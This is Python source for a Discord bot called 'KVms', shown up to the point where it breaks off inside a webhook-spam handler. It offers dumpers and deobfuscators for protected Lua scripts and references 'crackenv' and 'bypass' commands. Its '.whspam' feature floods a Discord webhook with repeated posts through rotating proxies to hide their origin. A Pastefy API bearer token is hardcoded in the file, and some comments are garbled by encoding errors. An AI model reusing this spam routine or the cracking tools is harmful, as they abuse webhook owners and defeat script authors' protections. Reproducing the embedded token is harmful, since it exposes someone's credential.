print("import discord
from discord.ext import commands
from discord import ButtonStyle
import tempfile
import subprocess
import os
import stat
import re
import io
import pathlib
from urllib.parse import urlsplit
import requests
import time
import threading
import asyncio
import aiohttp
import json
import string
import random
import signal
import hashlib
import heapq
import shutil
import secrets
try:
    import psutil
except ImportError:
    psutil = None
try:
    import resource
except ImportError:
    resource = None
from concurrent.futures import ThreadPoolExecutor
from difflib import SequenceMatcher
from datetime import datetime, timedelta

# =========================
# BYPASS IMPORT
# =========================
try:
    from bypass import run_bypass
    BYPASS_AVAILABLE = True
except ImportError:
    BYPASS_AVAILABLE = False

# =========================
# OWNER ID & LINK
# =========================
OWNER_ID = 1413400538120454158
MAIN_DISCORD_LINK = \"https://discord.gg/X4MdbwjBFw\"

# =========================
# WHITELISTED SERVERS
# =========================
WHITELISTED_GUILDS = {1533326719530963045, 1515517744676606022}

# =========================
# STORAGE
# =========================
banned_users: set = set()
sanitize_paths_enabled: bool = True
BOT_STARTED_AT = time.time()

# =========================
# EMOJIS
# =========================
EMOJI_SUCCESS = \"<:Success:1538870062050582598>\"
EMOJI_FAIL    = \"<:Fail:1538870064688664627>\"
EMOJI_LOADING = \"<a:Loading:1538852612248703027>\"

# =========================
# PREMIUM USERS
# =========================
ROOT = pathlib.Path(__file__).resolve().parent
PREMIUM_FILE = ROOT / \"premium_users.json\"

def _load_premium() -> dict:
    try:
        if PREMIUM_FILE.exists():
            data = json.loads(PREMIUM_FILE.read_text(encoding=\"utf-8\"))
            return {int(k): v for k, v in data.items()}
    except Exception as e:
        print(f\"[Premium] Load error: {e}\")
    return {}

def _save_premium(d: dict):
    try:
        out = {str(k): v for k, v in d.items()}
        PREMIUM_FILE.write_text(json.dumps(out, indent=2), encoding=\"utf-8\")
    except Exception as e:
        print(f\"[Premium] Save error: {e}\")

premium_users: dict = _load_premium()

def is_premium(uid: int) -> bool:
    if uid == OWNER_ID:
        return True
    if uid not in premium_users:
        return False
    exp = premium_users.get(uid)
    if exp is None:
        return True
    if exp == 0:
        return False
    return time.time() < exp

def _premium_expiry_str(uid: int) -> str:
    if uid not in premium_users:
        return \"None\"
    exp = premium_users.get(uid)
    if exp is None:
        return \"Lifetime\"
    if exp == 0:
        return \"Expired\"
    return datetime.fromtimestamp(exp).strftime(\"%Y-%m-%d %H:%M UTC\")

PREMIUM_ROLE_FILE = ROOT / \"premium_roles.json\"


def _load_premium_roles() -> dict:
    try:
        if PREMIUM_ROLE_FILE.exists():
            data = json.loads(PREMIUM_ROLE_FILE.read_text(encoding=\"utf-8\"))
            if isinstance(data, dict):
                return {int(guild_id): int(role_id)
                        for guild_id, role_id in data.items()}
    except Exception as e:
        print(f\"[PremiumRole] Load error: {e}\")
    return {}


def _save_premium_roles():
    try:
        PREMIUM_ROLE_FILE.write_text(
            json.dumps({str(guild_id): role_id for guild_id, role_id in premium_roles.items()}, indent=2),
            encoding=\"utf-8\")
    except Exception as e:
        print(f\"[PremiumRole] Save error: {e}\")


premium_roles: dict = _load_premium_roles()
_premium_role_ready_sync_done = False


async def _assign_premium_role(user, guild=None) -> int:
    \"\"\"Assign the configured premium role in one guild or all cached guilds.\"\"\"
    if user is None or not is_premium(int(user.id)):
        return 0
    guilds = [guild] if guild is not None else list(getattr(bot, \"guilds\", []))
    assigned = 0
    for target_guild in guilds:
        if target_guild is None:
            continue
        role_id = premium_roles.get(int(target_guild.id))
        role = target_guild.get_role(role_id) if role_id else None
        if role is None:
            if role_id:
                print(f\"[PremiumRole] configured role {role_id} is missing in {target_guild.id}\")
            continue
        if role.is_default() or getattr(role, \"managed\", False):
            print(f\"[PremiumRole] configured role {role_id} is not assignable in {target_guild.id}\")
            continue
        member = (user if getattr(user, \"guild\", None) is target_guild
                  else target_guild.get_member(int(user.id)))
        if member is None:
            continue
        me = getattr(target_guild, \"me\", None)
        if me is None or role.position >= me.top_role.position:
            print(f\"[PremiumRole] hierarchy prevents assignment in {target_guild.id}\")
            continue
        try:
            if role not in getattr(member, \"roles\", []):
                await member.add_roles(role, reason=\"KVms premium access\")
                assigned += 1
        except Exception as e:
            print(f\"[PremiumRole] assign failed in {target_guild.id}: {e}\")
    return assigned


async def _remove_premium_roles(user_id: int, guild=None) -> int:
    \"\"\"Remove the configured role when premium expires or is revoked.\"\"\"
    guilds = [guild] if guild is not None else list(getattr(bot, \"guilds\", []))
    removed = 0
    for target_guild in guilds:
        if target_guild is None:
            continue
        role_id = premium_roles.get(int(target_guild.id))
        role = target_guild.get_role(role_id) if role_id else None
        member = target_guild.get_member(int(user_id))
        if role is None or member is None or role not in getattr(member, \"roles\", []):
            continue
        me = getattr(target_guild, \"me\", None)
        if me is not None and role.position >= me.top_role.position:
            continue
        try:
            await member.remove_roles(role, reason=\"KVms premium expired or revoked\")
            removed += 1
        except Exception as e:
            print(f\"[PremiumRole] remove failed in {target_guild.id}: {e}\")
    return removed


async def _sync_premium_role(guild) -> int:
    \"\"\"Apply the configured role to current premium members in a guild.\"\"\"
    if guild is None or int(guild.id) not in premium_roles:
        return 0
    assigned = 0
    for member in getattr(guild, \"members\", []) or []:
        if is_premium(int(member.id)):
            assigned += await _assign_premium_role(member, guild)
    return assigned


async def _remove_role_from_premium_members(guild, role) -> int:
    \"\"\"Remove an old configured role without changing premium membership.\"\"\"
    if guild is None or role is None:
        return 0
    me = getattr(guild, \"me\", None)
    if me is not None and role.position >= me.top_role.position:
        return 0
    removed = 0
    for member in getattr(guild, \"members\", []) or []:
        if not is_premium(int(member.id)) or role not in getattr(member, \"roles\", []):
            continue
        try:
            await member.remove_roles(role, reason=\"Premium role configuration changed\")
            removed += 1
        except Exception as e:
            print(f\"[PremiumRole] old-role removal failed in {guild.id}: {e}\")
    return removed


async def _premium_cleanup_task():
    await bot.wait_until_ready()
    while True:
        await asyncio.sleep(300)
        now = time.time()
        changed = False
        expired = []
        for uid in list(premium_users.keys()):
            exp = premium_users.get(uid)
            if exp == 0 or (exp is not None and exp < now):
                del premium_users[uid]
                expired.append(uid)
                changed = True
        for uid in expired:
            await _remove_premium_roles(uid)
        if changed:
            _save_premium(premium_users)

# =========================
# CONTROLLED BOT SELF-TALK
# =========================
# Do not send fake errors or \"why is it quiet\" jokes on an idle channel.
# Self-talk is deliberately tied to real command activity and rate-limited,
# so the bot can occasionally have a short two-line conversation without
# spamming a quiet server.
SELF_TALK_CHANCE = 0.12
SELF_TALK_MIN_GAP = 10 * 60
_last_self_talk_at = 0.0

SELF_TALK_DIALOGUES = [
    (\"should we process another script?\", \"absolutely not, we just cleaned the temp folder.\"),
    (\"did that command finish cleanly?\", \"the logs are quiet, so I am choosing to believe it did.\"),
    (\"do you think anyone is still watching?\", \"probably. act professional.\"),
    (\"I could use a maintenance window.\", \"denied. keep the queue moving.\"),
    (\"was that output supposed to be that large?\", \"no comment. enforce the timeout.\"),
    (\"workers, status report?\", \"all workers are pretending to be busy.\"),
    (\"should I restart the pipeline?\", \"only if it actually breaks this time.\"),
    (\"I found another weird script.\", \"put it in the safe queue and do not panic.\"),
    (\"the queue looks suspiciously calm.\", \"give it a minute. someone will send a giant file.\"),
    (\"did anyone check the last result?\", \"the hash is recorded, so at least we can find it later.\"),
    (\"I think that sample is hiding something.\", \"then test it before trusting the recommendation.\"),
    (\"which engine should get the next job?\", \"the one with the strongest evidence, not the loudest name.\"),
    (\"the detector gave a low confidence score.\", \"good. uncertainty is better than a confident mistake.\"),
    (\"should we add another signature window?\", \"yes, first, middle, and last regions are safer together.\"),
    (\"that file arrived without a useful marker.\", \"leave it unknown and let the user choose the engine.\"),
    (\"can we keep the previews private?\", \"of course. store bounded metadata, never broadcast the source.\"),
    (\"the next request has a familiar shape.\", \"check the evidence first, then choose the smallest safe action.\"),
    (\"did the worker remember to clean up?\", \"the temporary paths are gone and the queue is still healthy.\"),
    (\"someone sent a very short sample.\", \"short clues can be useful, but never trust one weak pattern.\"),
    (\"the middle window looks different today.\", \"that is why the detector compares several regions.\"),
    (\"should this result go to the channel?\", \"no, private delivery keeps the source and output together.\"),
    (\"the queue is growing again.\", \"sort by priority and give each job a fair turn.\"),
    (\"I saw a strange character in the input.\", \"sanitize the preview and keep the original out of the logs.\"),
    (\"are the old samples still useful?\", \"keep their signatures; new samples should add evidence, not replace it.\"),
    (\"the last fetch took too long.\", \"fail safely and try again only through a verified route.\"),
    (\"can we call that a match yet?\", \"not until more than one region agrees.\"),
    (\"the output has a surprising number of lines.\", \"measure it, cap it, and send it privately.\"),
    (\"what if the pattern is common everywhere?\", \"then it is context, not a signature.\"),
    (\"I want to trust this recommendation.\", \"earn that trust with confidence above the threshold.\"),
    (\"the source name is missing.\", \"use a neutral filename and avoid guessing what it contains.\"),
    (\"should we keep another copy?\", \"only bounded metadata; full source does not belong in statistics.\"),
    (\"the status message is ready.\", \"keep it short and leave identifiers in the private record.\"),
    (\"did the timeout fire on schedule?\", \"yes, slow work should never hold the whole queue.\"),
    (\"the proxy list looks thin.\", \"then wait for a verified route instead of connecting directly.\"),
    (\"I found two matching regions.\", \"show the regions and confidence so the choice is understandable.\"),
    (\"the filename says everything is fine.\", \"filenames are suggestions, not evidence.\"),
    (\"someone asked for a quick answer.\", \"quick is fine; careless is not.\"),
    (\"can we make the message clearer?\", \"use plain words and keep the useful details visible.\"),
    (\"the cleanup pass found nothing left.\", \"excellent. an empty temporary folder is a quiet success.\"),
    (\"should a weak match trigger a recommendation?\", \"no, leave it unknown and let the original command continue.\"),
    (\"I think the queue needs a little patience.\", \"patience is cheaper than losing a result.\"),
    (\"the private delivery is complete.\", \"then record the size and timing, not the source itself.\"),
    (\"which part should we inspect first?\", \"start with the first window, then compare the middle and end.\"),
    (\"the input arrived from a reply.\", \"follow the reference carefully and keep the channel tidy.\"),
    (\"is another sample worth saving?\", \"only when the owner chooses the save action.\"),
    (\"the detector disagrees with itself.\", \"report the disagreement instead of inventing certainty.\"),
    (\"that was a clean run.\", \"good. reset the state and wait for the next request.\"),
    (\"can we make the exchange less repetitive?\", \"vary the wording, not the safety rules.\"),
    (\"the source may contain a mention.\", \"strip it from previews so nobody gets an accidental ping.\"),
    (\"the result is ready before the status changed.\", \"update the status once and keep the delivery private.\"),
    (\"what happens when every route fails?\", \"return a safe error; never fall back to a direct connection.\"),
    (\"I found a signature near the end.\", \"one region is a clue, not a verdict.\"),
    (\"the maintenance note is bounded.\", \"good. concise records are easier to audit and safer to keep.\"),
    (\"does a new sample erase the old one?\", \"never. add a signature set and preserve the history.\"),
    (\"we have another unknown input.\", \"unknown is an honest result; let the user decide what to run.\"),
]

def _ascii_safe(text: str) -> str:
    # Keep outgoing chat ASCII-only so emojis never turn into mojibake
    # on servers with broken encoding.
    return text.encode(\"ascii\", \"ignore\").decode(\"ascii\")

async def _send_to_main_channel(text: str) -> bool:
    \"\"\"Send controlled bot chatter only to the configured main channel.\"\"\"
    try:
        guild = bot.get_guild(ALLOWED_GUILD)
        if guild:
            for chid in ALLOWED_CHANNELS:
                ch = guild.get_channel(chid)
                if ch is not None:
                    await ch.send(text)
                    return True
    except Exception as e:
        print(f\"[SelfTalk] {e}\")
    return False

async def _maybe_self_talk():
    \"\"\"Occasionally send a short bot-to-bot exchange after real activity.\"\"\"
    global _last_self_talk_at
    if random.random() > SELF_TALK_CHANCE:
        return
    now = time.time()
    if now - _last_self_talk_at < SELF_TALK_MIN_GAP:
        return
    # Set the timestamp before sending so concurrent commands cannot create
    # multiple dialogues at the same time.
    _last_self_talk_at = now
    first, second = random.choice(SELF_TALK_DIALOGUES)
    if \"bot\" in first.lower() or \"bot\" in second.lower():
        return
    if await _send_to_main_channel(_ascii_safe(first)):
        await asyncio.sleep(1.2)
        await _send_to_main_channel(_ascii_safe(second))

# =========================
# KEY SYSTEM
# =========================
KEYS_FILE = ROOT / \"keys.json\"

def _load_keys() -> dict:
    try:
        if KEYS_FILE.exists():
            return json.loads(KEYS_FILE.read_text(encoding=\"utf-8\"))
    except Exception:
        pass
    return {}

def _save_keys(d: dict):
    try:
        KEYS_FILE.write_text(json.dumps(d, indent=2), encoding=\"utf-8\")
    except Exception as e:
        print(f\"[Keys] Save error: {e}\")

keys_db: dict = _load_keys()

def _gen_key() -> str:
    part = lambda n: ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
    return f\"KVms-{part(4)}-{part(4)}-{part(4)}-{random.randint(0,9)}-{part(2)}\"

# =========================
# DISABLED COMMANDS (persistent across restarts)
# =========================
DISABLED_FILE = ROOT / \"disabled_commands.json\"

def _load_disabled() -> set:
    try:
        if DISABLED_FILE.exists():
            data = json.loads(DISABLED_FILE.read_text(encoding=\"utf-8\"))
            if isinstance(data, list):
                return set(data)
    except Exception as e:
        print(f\"[Disabled] Load error: {e}\")
    return set()

def _save_disabled(s: set):
    try:
        DISABLED_FILE.write_text(json.dumps(sorted(s), indent=2), encoding=\"utf-8\")
    except Exception as e:
        print(f\"[Disabled] Save error: {e}\")

disabled_commands: set = _load_disabled()

# Public toggleable features (shown in .status / used by _reply_disabled).
# (name, human label) - these are the ONLY non-owner commands that can be
# disabled; owner commands are never listed publicly.
PUBLIC_FEATURES = [
    (\"l\",         \"Main dumper (.l)\"),
    (\"l2\",        \"Dumper v2 (.l2)\"),
    (\"l3\",        \"Dumper v3 (.l3)\"),
    (\"deobf\",     \"Deobfuscator (.deobf)\"),
    (\"wyn\",       \"Wynfuscate (.wyn)\"),
    (\"constant\",  \"Constant dump (.constant)\"),
    (\"promdeobf\", \"Prometheus deobf (.promdeobf)\"),
    (\"beautify\",  \"Beautifier (.beautify)\"),
    (\"lph\",       \"Single LPH engine (.lph)\"),
    (\"moonsec\",   \"MoonSec deobf (.moonsec)\"),
    (\"rename\",    \"Renamer (.rename)\"),
    (\"obf\",       \"Python obfuscator (.obf)\"),
    (\"upload\",    \"Pastefy uploader (.upload)\"),
]

# =========================
# TOS SYSTEM
# =========================
TOS_FILE = ROOT / \"tos_accepted.json\"

def _load_tos() -> set:
    try:
        if TOS_FILE.exists():
            return set(int(x) for x in json.loads(TOS_FILE.read_text(encoding=\"utf-8\")))
    except Exception:
        pass
    return set()

def _save_tos(s: set):
    try:
        TOS_FILE.write_text(json.dumps(list(s), indent=2), encoding=\"utf-8\")
    except Exception as e:
        print(f\"[TOS] Save error: {e}\")

tos_accepted: set = _load_tos()

TOS_TEXT = (
    \"**Terms of Service**\\n\\n\"
    \"By using KVms, you agree to the following:\\n\\n\"
    \"1. You are responsible for everything you submit and do through KVms. \"
    \"Only submit files and use features you are authorized to use.\\n\\n\"
    \"2. Abuse, exploitation, unauthorized access, or attempts to damage or disrupt KVms \"
    \"may result in your access being suspended or permanently removed.\\n\\n\"
    \"3. Paid features must not be shared, resold, or used to provide unauthorized access to others.\\n\\n\"
    \"4. KVms may temporarily go offline for maintenance, updates, or development. \"
    \"Subscription time will continue during normal service interruptions.\\n\\n\"
    \"5. KVms is free to use. Optional paid features are only required if you want \"
    \"cooldown removal & access to beta only features.\\n\\n\"
    \"By continuing to use KVms, you agree to these terms.\"
)

# =========================
# URL CACHE (10 min)
# =========================
_url_cache: dict = {}
URL_CACHE_TTL = 600

def _cache_get(url: str):
    if url in _url_cache:
        ts, data = _url_cache[url]
        if time.time() - ts < URL_CACHE_TTL:
            return data
        del _url_cache[url]
    return None

def _cache_set(url: str, data):
    _url_cache[url] = (time.time(), data)

# =========================
# PASTEFY
# =========================
PASTEFY_TOKEN = \"lMSG4aqAuZIZEMjAHUMuCduHePbV2AA4dYOGQQ6CnkUa5TTudZeMRByZbIYh\"
PASTEFY_API   = \"https://pastefy.app/api/v2/paste\"

def _upload_to_pastefy(content: str, title: str = \"KVms Output\") -> str:
    proxy_url = None
    try:
        proxy_url, proxy_map = _required_requests_proxy()
        r = requests.post(
            PASTEFY_API,
            headers={
                \"Authorization\": f\"Bearer {PASTEFY_TOKEN}\",
                \"Content-Type\": \"application/json\",
                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\"
            },
            proxies=proxy_map,
            json={\"title\": title, \"content\": content, \"visibility\": \"PUBLIC\"},
            timeout=15
        )
        proxy_manager.report_success(proxy_url)
        if r.status_code in (200, 201):
            data = r.json()
            pid = data.get(\"paste\", {}).get(\"id\") or data.get(\"id\")
            if pid:
                return f\"https://pastefy.app/{pid}/raw\"
    except Exception as e:
        if proxy_url:
            proxy_manager.report_fail(proxy_url)
        print(f\"[Pastefy] Error: {e}\")
    return None

# =========================
# USAGE TRACKING (3-hour report to owner DM - now includes tags)
# =========================
_user_usage: dict = {}
_usage_window_start: float = time.time()
USAGE_ALERT_THRESHOLD = 80
USAGE_REPORT_INTERVAL = 3 * 3600

async def _resolve_tag(uid: int) -> str:
    \"\"\"Return @username for a user id, falling back to member cache.\"\"\"
    try:
        u = bot.get_user(uid)
        if u is None:
            u = await bot.fetch_user(uid)
        if u is not None:
            return f\"@{u.name}\"
    except Exception:
        pass
    for g in bot.guilds:
        m = g.get_member(uid)
        if m is not None:
            return f\"@{m.name}\"
    return \"@unknown\"

async def _resolve_user_id(target: str):
    \"\"\"Resolve a user id from: <@mention> | raw id | username | @tag.\"\"\"
    target = (target or \"\").strip()
    if not target:
        return None
    m = re.match(r'<@!?(\\d+)>', target)
    if m:
        return int(m.group(1))
    if target.isdigit():
        return int(target)
    needle = target.lstrip('@').strip().lower()
    if not needle:
        return None
    candidates = list(bot.users)
    for g in bot.guilds:
        candidates.extend(g.members)
    # exact username first
    for u in candidates:
        try:
            if u.name.lower() == needle:
                return u.id
        except Exception:
            continue
    # then partial match
    for u in candidates:
        try:
            if needle in u.name.lower():
                return u.id
        except Exception:
            continue
    return None

async def _send_usage_report(reason: str):
    \"\"\"DM the owner a 3-hour usage report (with tags), then reset window.\"\"\"
    global _usage_window_start
    total = sum(_user_usage.values())
    if total == 0:
        lines = [\"no commands were used in this window. quiet one.\"]
    else:
        lines = []
        top = sorted(_user_usage.items(), key=lambda x: -x[1])[:10]
        for uid, n in top:
            tag = await _resolve_tag(uid)
            lines.append(f\"- {tag} (`{uid}`) - {n} command(s)\")
    try:
        owner = await bot.fetch_user(OWNER_ID)
        dm = await owner.create_dm()
        await dm.send(
            f\"**KVms usage report** ({reason})\\n\"
            f\"window: last 3 hours | total commands: {total} | users: {len(_user_usage)}\\n\"
            + \"\\n\".join(lines)
        )
    except Exception as e:
        print(f\"[Usage] Report failed: {e}\")
    _user_usage.clear()
    _usage_window_start = time.time()

async def usage_report_task():
    await bot.wait_until_ready()
    while True:
        await asyncio.sleep(USAGE_REPORT_INTERVAL)
        await _send_usage_report(\"every 3 hours\")


async def resource_monitor_task():
    \"\"\"Sample memory/CPU periodically and log threshold breaches for owners.\"\"\"
    await bot.wait_until_ready()
    while True:
        await asyncio.sleep(60)
        snapshot = _sample_process_resources()
        memory_mb = snapshot.get(\"memory_mb\")
        cpu_percent = snapshot.get(\"cpu_percent\")
        if memory_mb is not None and memory_mb >= 512:
            print(f\"[Resources] high memory usage: {memory_mb:.1f} MB\")
        if cpu_percent is not None and cpu_percent >= 90:
            print(f\"[Resources] high CPU usage: {cpu_percent:.1f}%\")

async def _track_usage(user_id: int):
    global _usage_window_start
    now = time.time()
    if now - _usage_window_start > USAGE_REPORT_INTERVAL:
        await _send_usage_report(\"window rollover\")
    _user_usage.setdefault(user_id, 0)
    _user_usage[user_id] += 1
    total = sum(_user_usage.values())
    if total >= USAGE_ALERT_THRESHOLD:
        await _send_usage_report(f\"usage alert - {total} commands in one window\")

# =========================
# COMMAND STATS (owner .stats)
# =========================
STATS_FILE = ROOT / \"stats.json\"

def _load_stats() -> dict:
    try:
        if STATS_FILE.exists():
            data = json.loads(STATS_FILE.read_text(encoding=\"utf-8\"))
            return {int(k): {str(c): int(n) for c, n in v.items()} for k, v in data.items()}
    except Exception:
        pass
    return {}

def _save_stats(d: dict):
    try:
        out = {str(k): {str(c): int(n) for c, n in v.items()} for k, v in d.items()}
        STATS_FILE.write_text(json.dumps(out, indent=2), encoding=\"utf-8\")
    except Exception as e:
        print(f\"[Stats] Save error: {e}\")

cmd_stats: dict = _load_stats()

def _track_cmd(user_id: int, cmd: str):
    u = cmd_stats.setdefault(user_id, {})
    u[cmd] = u.get(cmd, 0) + 1


_resource_snapshot = {\"memory_mb\": None, \"cpu_percent\": None, \"sampled_at\": None}

def _sample_process_resources() -> dict:
    \"\"\"Return a small, reusable process resource snapshot.\"\"\"
    memory_mb = cpu_percent = None
    try:
        if psutil is not None:
            process = psutil.Process()
            memory_mb = process.memory_info().rss / 1024 / 1024
            cpu_percent = process.cpu_percent(interval=None)
        elif resource is not None:
            memory_mb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024
    except Exception:
        pass
    _resource_snapshot.update({
        \"memory_mb\": memory_mb,
        \"cpu_percent\": cpu_percent,
        \"sampled_at\": time.time(),
    })
    return dict(_resource_snapshot)

# =========================
# HEAVY USAGE ROAST (15 cmds / 10 min)
# =========================
HEAVY_LIMIT = 15
HEAVY_WINDOW = 10 * 60
HEAVY_ROAST_MIN_GAP = 20  # seconds between roasts so we don't spam

_heavy_usage: dict = {}        # uid -> list[timestamps]
_heavy_last_roast: dict = {}   # uid -> last roast timestamp

ROASTS = [
    \"bro you think this is your dad workspace.. Hell nah stop burning our CPU lil bro\",
    \"ayo chill, my CPU ain't free real estate\",
    \"15 commands in 10 minutes? what are you, a government employee on break?\",
    \"my fans are screaming louder than your ego right now\",
    \"bro really out here treating the bot like a public toilet\",
    \"touch some grass, hydrate, then come back lil bro\",
    \"this aint a doordash for skids, slow down\",
    \"you got that '40 tabs open' energy and I'm the one paying for it\",
    \"chill before I start charging rent for CPU time\",
    \"bro said 'one more dump' for the 16th time\",
    \"my thermal paste is begging for mercy, slow down\",
    \"you run commands like you're speedrunning a ban, relax\",
    \"the engine is tired, I'm tired, we're ALL tired lil bro\",
    \"keep it up and I'll start processing your scripts with a toaster\",
    \"that's a lot of commands for someone who probably can't code in Notepad\",
    \"bro is on a mission, go touch some grass\",
    \"slow down before the host sends ME a bill and I forward it to you\",
    \"at this rate your key is gonna earn frequent flyer miles\",
    \"bro really speedrunning the whole feature list in one sitting\",
    \"you and this bot need some space, take a break\",
    \"the engine just asked me for a coffee break because of you\",
    \"imagine explaining this command history to your ISP\",
    \"one more command and I'm calling your mom's CPU\",
    \"you're the reason the bot has trust issues\",
    \"keep spamming and I'll rename every variable in your script to 'skid'\",
    \"this is a deobf bot, not a slot machine, stop pulling the lever\",
    \"your cooldown messages are gonna get their own fan club\",
    \"bro got that premium mindset on a free account\",
    \"the queue is longer than your playtime, chill out\",
    \"I'd tell you to touch grass but you'd probably dump it\",
]


def _check_heavy_usage(uid: int) -> bool:
    now = time.time()
    ts = _heavy_usage.setdefault(uid, [])
    ts[:] = [t for t in ts if now - t < HEAVY_WINDOW]
    ts.append(now)
    return len(ts) >= HEAVY_LIMIT


async def _send_roast(message):
    uid = message.author.id
    now = time.time()
    if now - _heavy_last_roast.get(uid, 0) < HEAVY_ROAST_MIN_GAP:
        return
    _heavy_last_roast[uid] = now
    try:
        await _safe_reply(message, content=random.choice(ROASTS), mention_author=True)
    except Exception as e:
        print(f\"[Roast] {e}\")

# =========================
# COMMAND DETECTION (so normal chat is never counted as usage)
# =========================
# Every trigger the bot reacts to. Used to decide whether a message is a
# real command ƒ€š‚ chatting in the whitelist channel must NOT count toward
# stats, the usage alert, or the heavy-usage roast.
COMMAND_NAMES = {
    # on_message handled
    \"l\", \"l2\", \"l3\", \"lph\", \"deobf\", \"wyn\", \"constant\",
    \"promdeobf\", \"beautify\", \"moonsec\", \"rename\", \"obf\", \"upload\", \"get\", \"whspam\",
    # bot.command decorated
    \"help\", \"ownerhelp\", \"cfg\", \"redeem\", \"detect\", \"dtc\", \"inpdtc\",
    \"genkey\", \"revoke\", \"unprem\", \"prem\", \"premrole\", \"ban\", \"banlist\", \"disable\", \"sanitize\",
    \"stats\", \"status\", \"queue\", \"health\", \"proxies\", \"reloadproxies\", \"rp\", \"clearbl\",
    \"serv\", \"del\", \"nuke\", \"cancel\", \"job\", \"search\", \"dashboard\", \"dash\", \"ldebug\", \"setwebhook\", \"support\",
    \"addobf\", \"delobf\", \"obfpat\", \"obfmeta\", \"obflist\", \"obfs\", \"obfshow\", \"obfinfo\", \"obftest\", \"crackenv\", \"cenv\", \"luarmor\",
}

def _is_command_message(content: str) -> bool:
    if not content or not content.startswith(\".\"):
        return False
    m = re.match(r'^\\.([A-Za-z0-9]+)', content)
    if not m:
        return False
    return m.group(1).lower() in COMMAND_NAMES

# =========================
# ANTI-SPAM
# =========================
_cooldown_attempts: dict = {}

async def _check_anti_spam(message, cmd: str) -> bool:
    uid = message.author.id
    now = time.time()
    attempts = _cooldown_attempts.get(uid, [])
    attempts = [t for t in attempts if now - t < 10]
    attempts.append(now)
    _cooldown_attempts[uid] = attempts
    if len(attempts) > 3:
        try:
            if message.guild and message.author.guild_permissions:
                until = datetime.utcnow() + timedelta(minutes=5)
                member = message.guild.get_member(uid)
                if member:
                    await member.timeout(until, reason=\"KVms anti-spam\")
                    try:
                        await message.reply(\"ƒ... ƒ‚‚ Timed out for 5 minutes - chill a bit.\")
                    except Exception:
                        pass
        except Exception as e:
            print(f\"[AntiSpam] {e}\")
        return False
    return True

# =========================
# LPH COOLDOWN (6.7 minutes for standard users; premium/owner = no CD)
# =========================
LPH_COOLDOWN_SECONDS = 402
LPH_OWNER_ERROR_MAX_BYTES = 64 * 1024
lph_cooldowns: dict = {}

def _lph_check_cooldown(user_id: int) -> float:
    if is_premium(user_id):
        return 0.0
    last = lph_cooldowns.get(user_id, 0)
    return max(0.0, LPH_COOLDOWN_SECONDS - (time.time() - last))

def _lph_set_cooldown(user_id: int):
    lph_cooldowns[user_id] = time.time()

# =========================
# .L COOLDOWN (8 seconds)
# =========================
L_COOLDOWN_SECONDS = 8
L_ADAPTIVE_COOLDOWN_SECONDS = 10
L_ADAPTIVE_JOB_THRESHOLD = 20
L_ADAPTIVE_WINDOW_SECONDS = 10 * 60
l_cooldowns: dict = {}
_l_job_history: dict = {}  # user id -> timestamps of submitted .l jobs

def _l_effective_cooldown(user_id: int) -> float:
    if is_premium(user_id):
        return 0.0
    now = time.time()
    history = _l_job_history.setdefault(user_id, [])
    history[:] = [stamp for stamp in history if now - stamp < L_ADAPTIVE_WINDOW_SECONDS]
    if len(history) >= L_ADAPTIVE_JOB_THRESHOLD:
        return L_ADAPTIVE_COOLDOWN_SECONDS
    return L_COOLDOWN_SECONDS

def _l_check_cooldown(user_id: int) -> float:
    last = l_cooldowns.get(user_id, 0)
    return max(0.0, _l_effective_cooldown(user_id) - (time.time() - last))

def _l_set_cooldown(user_id: int, job_count: int = 1):
    now = time.time()
    l_cooldowns[user_id] = now
    history = _l_job_history.setdefault(user_id, [])
    history[:] = [stamp for stamp in history if now - stamp < L_ADAPTIVE_WINDOW_SECONDS]
    history.extend([now] * max(1, int(job_count or 1)))

# =========================
# WEBHOOK SPAM (.whspam)
# =========================
WEBHOOK_FILE = ROOT / \"webhook_url.txt\"

def _load_webhook() -> str:
    try:
        if WEBHOOK_FILE.exists():
            return WEBHOOK_FILE.read_text(encoding=\"utf-8\").strip()
    except Exception as e:
        print(f\"[Webhook] Load error: {e}\")
    return \"\"

def _save_webhook(url: str):
    try:
        WEBHOOK_FILE.write_text(url.strip(), encoding=\"utf-8\")
    except Exception as e:
        print(f\"[Webhook] Save error: {e}\")

WEBHOOK_URL = _load_webhook()

WHSPAM_COUNT            = 10     # messages sent per .whspam use
WHSPAM_NONPREMIUM_CD    = 10 * 60
WHSPAM_PREMIUM_CD       = 60
WHSPAM_ESCALATE_LIMIT   = 15     # uses in one hour
WHSPAM_ESCALATE_WINDOW  = 3600
WHSPAM_ESCALATED_CD     = 30 * 60

_whspam_cooldowns: dict = {}   # uid -> last use timestamp
_whspam_hits: dict = {}        # uid -> [timestamps in window]

def _whspam_escalated(uid: int) -> bool:
    now = time.time()
    hits = _whspam_hits.get(uid, [])
    hits = [t for t in hits if now - t < WHSPAM_ESCALATE_WINDOW]
    return len(hits) >= WHSPAM_ESCALATE_LIMIT

def _whspam_record(uid: int):
    now = time.time()
    hits = _whspam_hits.setdefault(uid, [])
    hits.append(now)
    hits[:] = [t for t in hits if now - t < WHSPAM_ESCALATE_WINDOW]
    _whspam_hits[uid] = hits
    _whspam_cooldowns[uid] = now

def _whspam_cd(uid: int) -> float:
    now = time.time()
    base = WHSPAM_ESCALATED_CD if _whspam_escalated(uid) else (
        WHSPAM_PREMIUM_CD if is_premium(uid) else WHSPAM_NONPREMIUM_CD)
    last = _whspam_cooldowns.get(uid, 0)
    return max(0.0, base - (now - last))

async def _send_webhook_spam(url: str, text: str):
    if not url:
        return 0
    payload = {\"content\": _ascii_safe(text)}
    proxy_url = proxy_manager.next()
    if not proxy_url:
        return 0
    connector = None
    try:
        connector, connector_proxy = proxy_manager.get_connector()
        if not connector_proxy:
            return 0
        sent = 0
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=20),
        ) as session:
            for i in range(WHSPAM_COUNT):
                try:
                    req_kw = {\"json\": payload}
                    if not SOCKS_AVAILABLE:
                        req_kw[\"proxy\"] = connector_proxy
                    async with session.post(url, **req_kw) as r:
                        if r.status in (200, 204):
                            sent += 1
                            proxy_manager.report_success(connector_proxy)
                        else:
                            proxy_manager.report_fail(connector_proxy)
                except Exception:
                    proxy_manager.report_fail(connector_proxy)
                await asyncio.sleep(0.35)
        return sent
    except Exception:
        if proxy_url:
            proxy_manager.report_fail(proxy_url)
        return 0
    finally:
        if connector and not connector.closed:
            await connector.close()

async def _handle_whspam_command(message, content: str):
    uid = message.author.id

